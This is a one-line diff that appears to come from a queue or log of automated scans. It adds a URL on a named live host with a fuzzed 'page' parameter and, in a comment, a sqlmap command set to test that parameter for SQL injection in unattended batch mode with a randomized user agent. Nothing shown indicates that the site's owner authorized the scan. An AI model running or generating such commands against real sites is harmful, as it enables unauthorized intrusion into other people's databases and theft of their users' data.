@@ -1,0 +1,1 @@
+http://api.dqdl.net:80/addons/cms/index/get_index_list.html?page=%40%40fdWFC (GET)  # "D:\Program Files\Python\Python311\Scripts\sqlmap" -r sqlmap_requests\014_SQL_Injection_page_3884372510942168483.txt --batch --smart --random-agent --output-dir sqlmap_output\014_3884372510942168483 -p page
